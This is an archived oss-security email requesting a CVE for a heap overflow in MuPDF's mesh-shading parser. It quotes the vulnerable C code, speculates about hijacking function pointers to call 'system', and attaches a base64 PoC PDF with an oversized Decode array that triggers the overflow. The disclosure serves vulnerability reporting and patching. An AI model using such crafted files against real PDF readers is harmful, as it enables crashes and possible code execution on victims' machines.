X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["21116" "Wednesday" "3" "August" "2016" "13:14:50" "+0800" "redrain root" "rootredrain@gmail.com" "<CAPGxrc9YpXo-DHd-oSOker5MhCAH1QoCW-6O4JE+pZScG79vng@mail.gmail.com>" "369" "[oss-security] CVE request:Heap overflow vulns in MuPDF" nil nil nil "8" "2016080305:14:50" "[oss-security] CVE request:Heap overflow vulns in MuPDF" (number mark "U       rootredrain@ Aug  3  369/21116 " thread-indent "\"[oss-security] CVE request:Heap overflow vulns in MuPDF\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 4042 invoked by uid 550); 3 Aug 2016 05:15:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 4022 invoked from network); 3 Aug 2016 05:15:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=60KSeFGS9utcwGo1ZIOQXz0ZGiN1+69OOIjHtZMUlFE=;
        b=LD1KqhmPgmqfLAJOxWoopbA4p8BN+U/I37wTfvZnyGBIxsiMaZVS5Tz4MAIcdcPyzs
         jXo50hdRKxZDVyjmxZ/H7jidTucgCGsUAAwQjuJFZSm1oVjJtY6zlJEYWl6YQ6mLn//k
         I3BP1JB2FuOZqjcCPblQYCT37Y4NXVvdPRYF0RnE2BM1WdC9x3726Ce9M88lrzHQGKyI
         RRMl2wSzHuMTCZ28aGFM4kphv6eMDmquefuHXWHR+5cUbZMAQ1C30vmiAmKc0+WIJNvb
         0g05Mm5rntsVmfdNMHqSXAOWGTpB8G+5+N2K0pWq+n3FGniR6kft4/zpHB8zSOs6VtRm
         2Rqg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=60KSeFGS9utcwGo1ZIOQXz0ZGiN1+69OOIjHtZMUlFE=;
        b=G32YLYo5RVL9EV13CeGRoWmY8OdgstzVaAwYQMMHaCc2YHz0ZhK+KrVHHllNauI1MF
         IlobJojYtogkjFSiM+f7ckf/fl/0S7L7YVckK0r0J8wnWkyaU5at29LuthWKxAvhReBZ
         Fs13I26R8J8lzX2VI1cnKb7zomcRRV/NYEllVkmcS0jnlZUn3V16kA7Bcr4bbaPg1w31
         VBWirYtsRPhM546uHyPFUIOEv2DI90Q9jJYZYjufqwQax8upXlCynrITkJOOLEy1ocMQ
         JTEsvNiqDmeh3y/Pqb3f69Ujd8ySbXS35p2M+uRqWUcGq9yZcYfYQilB2G5Cphhe3LEE
         EIEg==
X-Gm-Message-State: AEkoouvg1m41uOiV5v0z+6gsW1Yqclde5QZiY3eqHZi0Yt+GMXHV1fZ5gLOuPyJQSf1fGzWfnIUKyTrQjFOHWA==
X-Received: by 10.129.43.139 with SMTP id r133mr13392486ywr.269.1470201291161;
 Tue, 02 Aug 2016 22:14:51 -0700 (PDT)
MIME-Version: 1.0
From: redrain root <rootredrain@gmail.com>
Date: Wed, 3 Aug 2016 13:14:50 +0800
Message-ID: <CAPGxrc9YpXo-DHd-oSOker5MhCAH1QoCW-6O4JE+pZScG79vng@mail.gmail.com>
To: oss-security@lists.openwall.com, cve-assign@mitre.org
Content-Type: multipart/mixed; boundary=001a1141e5fcb559cd053923e9a1
Subject: [oss-security] CVE request:Heap overflow vulns in MuPDF

--001a1141e5fcb559cd053923e9a1
Content-Type: multipart/alternative; boundary=001a1141e5fcb559c8053923e99f

--001a1141e5fcb559c8053923e99f
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Title: Heap overflow vulns in MuPDF
Author: Yu Hong, yu.hong@chaitin.com;Zheng Jihong,jihong.zheng@chaitin.com
Data: 2016-08-01
Dowload Site: http://ghostscript.com/download;http://mupdf.com/downloads/
Vendor: Ghostscript
----------------------------------------------------------
Vulnerability:
Recently,I found a heap overflow vulnerability that cause this crash .
I thought it a dangerous vulnerability because there are so many function
point in the heap and the program have important the function "system".

The location of this vulnerability is at "pdf_load_mesh_params" function,at
 "source/pdf/pdf-shade.c" .

obj =3D pdf_dict_get(ctx, dict, PDF_NAME_Decode);
if (pdf_array_len(ctx, obj) >=3D 6)
{
n =3D (pdf_array_len(ctx, obj) - 4) / 2;
shade->u.m.x0 =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 0));
shade->u.m.x1 =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 1));
shade->u.m.y0 =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 2));
shade->u.m.y1 =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 3));
for (i =3D 0; i < n; i++)
{
shade->u.m.c0[i] =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 4 + i * 2));
shade->u.m.c1[i] =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 5 + i * 2));
}
}



the length of array return from "pdf_array_len"  not be checked. But the
max size of "shade->u.m.C0/C1" is defined as a macro(32 as default). So if
I make a pdf which have a large decode array. This code will cause a heap
overflow .

And the overflow data could be control, And on the memory I overflow , I
found a struct which full of function point. Maybe I can let it point to
got table for a chance to call "system"

issue:
http://bugs.ghostscript.com/show_bug.cgi?id=3D696954

fix code:
http://git.ghostscript.com/?p=3Dmupdf.git;h=3D39b0f07dd960f34e7e6bf230ffc3d=
87c41ef0f2e

PoC:

reference attachment

--from redrain =E7=A5=9D=E5=A5=BD

--001a1141e5fcb559c8053923e99f
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div>Title: Heap overflow vulns in MuPDF</div><div>Author:=
 Yu Hong, <a href=3D"mailto:yu.hong@chaitin.com">yu.hong@chaitin.com</a>;Zh=
eng Jihong,<a href=3D"mailto:jihong.zheng@chaitin.com">jihong.zheng@chaitin=
.com</a>=C2=A0</div><div>Data: 2016-08-01</div><div>Dowload Site: <a href=
=3D"http://ghostscript.com/download;http://mupdf.com/downloads/">http://gho=
stscript.com/download;http://mupdf.com/downloads/</a></div><div>Vendor: Gho=
stscript</div><div>--------------------------------------------------------=
--</div><div>Vulnerability:</div><div>Recently,I found a heap overflow vuln=
erability that cause this crash .</div><div>I thought it a dangerous vulner=
ability because there are so many function point in the heap and the progra=
m have important the function &quot;system&quot;.=C2=A0</div><div><br></div=
><div>The location of this vulnerability is at &quot;pdf_load_mesh_params&q=
uot; function,at =C2=A0&quot;source/pdf/pdf-shade.c&quot; .=C2=A0</div><div=
><br></div><div>obj =3D pdf_dict_get(ctx, dict, PDF_NAME_Decode);</div><div=
><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	</span>if =
(pdf_array_len(ctx, obj) &gt;=3D 6)</div><div><span class=3D"gmail-Apple-ta=
b-span" style=3D"white-space:pre">	</span>{</div><div><span class=3D"gmail-=
Apple-tab-span" style=3D"white-space:pre">		</span>n =3D (pdf_array_len(ctx=
, obj) - 4) / 2;</div><div><span class=3D"gmail-Apple-tab-span" style=3D"wh=
ite-space:pre">		</span>shade-&gt;u.m.x0 =3D pdf_to_real(ctx, pdf_array_get=
(ctx, obj, 0));</div><div><span class=3D"gmail-Apple-tab-span" style=3D"whi=
te-space:pre">		</span>shade-&gt;u.m.x1 =3D pdf_to_real(ctx, pdf_array_get(=
ctx, obj, 1));</div><div><span class=3D"gmail-Apple-tab-span" style=3D"whit=
e-space:pre">		</span>shade-&gt;u.m.y0 =3D pdf_to_real(ctx, pdf_array_get(c=
tx, obj, 2));</div><div><span class=3D"gmail-Apple-tab-span" style=3D"white=
-space:pre">		</span>shade-&gt;u.m.y1 =3D pdf_to_real(ctx, pdf_array_get(ct=
x, obj, 3));</div><div><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">		</span>for (i =3D 0; i &lt; n; i++)</div><div><span class=3D"g=
mail-Apple-tab-span" style=3D"white-space:pre">		</span>{</div><div><span c=
lass=3D"gmail-Apple-tab-span" style=3D"white-space:pre">			</span>shade-&gt=
;u.m.c0[i] =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 4 + i * 2));</div><=
div><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">			</spa=
n>shade-&gt;u.m.c1[i] =3D pdf_to_real(ctx, pdf_array_get(ctx, obj, 5 + i * =
2));</div><div><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
e">		</span>}</div><div><span class=3D"gmail-Apple-tab-span" style=3D"white=
-space:pre">	</span>}</div><div><br></div><div><br></div><div><br></div><di=
v>the length of array return from &quot;pdf_array_len&quot; =C2=A0not be ch=
ecked. But the max size of &quot;shade-&gt;u.m.C0/C1&quot; is defined as a =
macro(32 as default). So if I make a pdf which have a large decode array. T=
his code will cause a heap overflow .</div><div><br></div><div>And the over=
flow data could be control, And on the memory I overflow , I found a struct=
 which full of function point. Maybe I can let it point to got table for a =
chance to call &quot;system&quot;</div><div><br></div><div>issue:</div><div=
><a href=3D"http://bugs.ghostscript.com/show_bug.cgi?id=3D696954">http://bu=
gs.ghostscript.com/show_bug.cgi?id=3D696954</a><br></div><div><br></div><di=
v>fix code:</div><div><a href=3D"http://git.ghostscript.com/?p=3Dmupdf.git;=
h=3D39b0f07dd960f34e7e6bf230ffc3d87c41ef0f2e">http://git.ghostscript.com/?p=
=3Dmupdf.git;h=3D39b0f07dd960f34e7e6bf230ffc3d87c41ef0f2e</a><br></div><div=
><br></div><div>PoC:</div><div><br></div><div>reference attachment<br></div=
><div><br></div><div><div class=3D"gmail_signature"><div dir=3D"ltr"><div><=
div dir=3D"ltr"><div><div dir=3D"ltr">--from redrain =E7=A5=9D=E5=A5=BD<div=
><img src=3D"https://docs.google.com/uc?id=3D0ByKrCvnQJ2wZeDg3ZU1sMjg5SmM&a=
mp;export=3Ddownload" id=3D"exifviewer-img-71"><br></div></div></div></div>=
</div></div></div></div>
</div>

--001a1141e5fcb559c8053923e99f--

--001a1141e5fcb559cd053923e9a1
Content-Type: application/pdf; name="p.pdf"
Content-Disposition: attachment; filename="p.pdf"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_irefuxkc0

JVBERi0xLjQKJcfsj6IKNSAwIG9iago8PC9MZW5ndGggNiAwIFIvRmlsdGVy
IC9GbGF0ZURlY29kZT4+CnN0cmVhbQp4nCtUMNAzVDAAQSidnMulH2SukF4M
pCwUkov1gywVipPzuEByZoZGBgrmlkCiKJUrjSuQCwCyew3EZW5kc3RyZWFt
CmVuZG9iago2IDAgb2JqCjU4CmVuZG9iago0IDAgb2JqCjw8L1R5cGUvUGFn
ZS9NZWRpYUJveCBbMCAwIDYxMiA3OTJdCi9QYXJlbnQgMyAwIFIKL1Jlc291
cmNlczw8L1Byb2NTZXRbL1BERl0KL0NvbG9yU3BhY2UgMTEgMCBSCi9FeHRH
U3RhdGUgMTIgMCBSCi9QYXR0ZXJuIDEzIDAgUgovU2hhZGluZyAxNCAwIFIK
Pj4KL0NvbnRlbnRzIDUgMCBSCj4+CmVuZG9iagozIDAgb2JqCjw8IC9UeXBl
IC9QYWdlcyAvS2lkcyBbCjQgMCBSCl0gL0NvdW50IDEKPj4KZW5kb2JqCjEg
MCBvYmoKPDwvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMyAwIFIKL01ldGFkYXRh
IDE1IDAgUgo+PgplbmRvYmoKNyAwIG9iago8PC9UeXBlL0V4dEdTdGF0ZQov
T1BNIDE+PmVuZG9iago4IDAgb2JqClsvUGF0dGVybl0KZW5kb2JqCjExIDAg
b2JqCjw8L1I4CjggMCBSPj4KZW5kb2JqCjEyIDAgb2JqCjw8L1I3CjcgMCBS
Pj4KZW5kb2JqCjEzIDAgb2JqCjw8L1I5CjkgMCBSPj4KZW5kb2JqCjkgMCBv
YmoKPDwvUGF0dGVyblR5cGUgMgovU2hhZGluZyAxMCAwIFIKL01hdHJpeFsx
CjAKMAoxCjMwNgozOTZdPj5lbmRvYmoKMTQgMCBvYmoKPDwvUjEwCjEwIDAg
Uj4+CmVuZG9iagoxMCAwIG9iago8PC9TaGFkaW5nVHlwZSA0Ci9Db2xvclNw
YWNlL0RldmljZVJHQgovRGVjb2RlWy0xNjM4NAoxNjM4NAotMTYzODQKMTYz
ODQKMAoxCjAKMQowCjFdCi9CaXRzUGVyQ29vcmRpbmF0ZSAyNAovQml0c1Bl
ckNvbXBvbmVudCAxNgovQml0c1BlckZsYWcgOC9MZW5ndGggNzg+PnN0cmVh
bQoAgAAAgAAA//8AAP//AIJAAIJAAAAA/////wB9wACCQAAAAP////8CfcAA
fcAAAAD/////AoJAAH3AAAAA/////wKCQACCQAAAAP////8KZW5kc3RyZWFt
CmVuZG9iagoxNSAwIG9iago8PC9UeXBlL01ldGFkYXRhCi9TdWJ0eXBlL1hN
TC9MZW5ndGggMTI4Nz4+c3RyZWFtCjw/eHBhY2tldCBiZWdpbj0n77u/JyBp
ZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+Cjw/YWRvYmUteGFwLWZp
bHRlcnMgZXNjPSJDUkxGIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0nYWRvYmU6
bnM6bWV0YS8nIHg6eG1wdGs9J1hNUCB0b29sa2l0IDIuOS4xLTEzLCBmcmFt
ZXdvcmsgMS42Jz4KPHJkZjpSREYgeG1sbnM6cmRmPSdodHRwOi8vd3d3Lncz
Lm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjJyB4bWxuczppWD0naHR0
cDovL25zLmFkb2JlLmNvbS9pWC8xLjAvJz4KPHJkZjpEZXNjcmlwdGlvbiBy
ZGY6YWJvdXQ9Jzg2NWI4OGE5LTEwYjItMTFlYS0wMDAwLTI4NDhiODE5YzRj
MicgeG1sbnM6cGRmPSdodHRwOi8vbnMuYWRvYmUuY29tL3BkZi8xLjMvJyBw
ZGY6UHJvZHVjZXI9J0dQTCBHaG9zdHNjcmlwdCA4LjYyJy8+CjxyZGY6RGVz
Y3JpcHRpb24gcmRmOmFib3V0PSc4NjViODhhOS0xMGIyLTExZWEtMDAwMC0y
ODQ4YjgxOWM0YzInIHhtbG5zOnhhcD0naHR0cDovL25zLmFkb2JlLmNvbS94
YXAvMS4wLycgeGFwOk1vZGlmeURhdGU9JzIwMDktMTEtMjRUMDI6MDk6MTIr
MDE6MDAnIHhhcDpDcmVhdGVEYXRlPScyMDA5LTExLTI0VDAyOjA5OjEyKzAx
OjAwJz48eGFwOkNyZWF0b3JUb29sPlVua25vd25BcHBsaWNhdGlvbjwveGFw
OkNyZWF0b3JUb29sPjwvcmRmOkRlc2NyaXB0aW9uPgo8cmRmOkRlc2NyaXB0
aW9uIHJkZjphYm91dD0nODY1Yjg4YTktMTBiMi0xMWVhLTAwMDAtMjg0OGI4
MTljNGMyJyB4bWxuczp4YXBNTT0naHR0cDovL25zLmFkb2JlLmNvbS94YXAv
MS4wL21tLycgeGFwTU06RG9jdW1lbnRJRD0nODY1Yjg4YTktMTBiMi0xMWVh
LTAwMDAtMjg0OGI4MTljNGMyJy8+CjxyZGY6RGVzY3JpcHRpb24gcmRmOmFi
b3V0PSc4NjViODhhOS0xMGIyLTExZWEtMDAwMC0yODQ4YjgxOWM0YzInIHht
bG5zOmRjPSdodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLycgZGM6
Zm9ybWF0PSdhcHBsaWNhdGlvbi9wZGYnPjxkYzp0aXRsZT48cmRmOkFsdD48
cmRmOmxpIHhtbDpsYW5nPSd4LWRlZmF1bHQnPlVudGl0bGVkPC9yZGY6bGk+
PC9yZGY6QWx0PjwvZGM6dGl0bGU+PC9yZGY6RGVzY3JpcHRpb24+CjwvcmRm
OlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0n
dyc/PgplbmRzdHJlYW0KZW5kb2JqCjIgMCBvYmoKPDwvUHJvZHVjZXIoR1BM
IEdob3N0c2NyaXB0IDguNjIpCi9DcmVhdGlvbkRhdGUoRDoyMDA5MTEyNDAy
MDkxMiswMScwMCcpCi9Nb2REYXRlKEQ6MjAwOTExMjQwMjA5MTIrMDEnMDAn
KT4+ZW5kb2JqCnhyZWYKMCAxNgowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAw
MDA0MDMgMDAwMDAgbiAKMDAwMDAwMjM2MiAwMDAwMCBuIAowMDAwMDAwMzQ0
IDAwMDAwIG4gCjAwMDAwMDAxNjEgMDAwMDAgbiAKMDAwMDAwMDAxNSAwMDAw
MCBuIAowMDAwMDAwMTQzIDAwMDAwIG4gCjAwMDAwMDA0NjggMDAwMDAgbiAK
MDAwMDAwMDUwOSAwMDAwMCBuIAowMDAwMDAwNjI1IDAwMDAwIG4gCjAwMDAw
MDA3MzEgMDAwMDAgbiAKMDAwMDAwMDUzNSAwMDAwMCBuIAowMDAwMDAwNTY1
IDAwMDAwIG4gCjAwMDAwMDA1OTUgMDAwMDAgbiAKMDAwMDAwMDY5OSAwMDAw
MCBuIAowMDAwMDAwOTk4IDAwMDAwIG4gCnRyYWlsZXIKPDwgL1NpemUgMTYg
L1Jvb3QgMSAwIFIgL0luZm8gMiAwIFIKL0lEIFs8QjFEMjUzRUVEM0ZGMzk3
MTY3REQ5QTNENDI0MTg5QTQ+PEIxRDI1M0VFRDNGRjM5NzE2N0REOUEzRDQy
NDE4OUE0Pl0KPj4Kc3RhcnR4cmVmCjI0ODUKMTAgMCBvYmogCjw8Ci9TaGFk
aW5nVHlwZSA0Ci9Db2xvclNwYWNlIC9EZXZpY2VSR0IKL0RlY29kZSBbIDQy
OTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5
NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0
OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5
NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2
NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3
Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5Njcy
OTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5
NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1
IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUg
NDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0
Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQy
OTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5
NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0
OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5
NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2
NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3
Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5Njcy
OTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5
NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1
IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUg
NDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0
Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQy
OTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5
NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0
OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5
NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2
NzI5NSA0Mjk0OTY3Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSA0Mjk0OTY3
Mjk1IDQyOTQ5NjcyOTUgNDI5NDk2NzI5NSAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
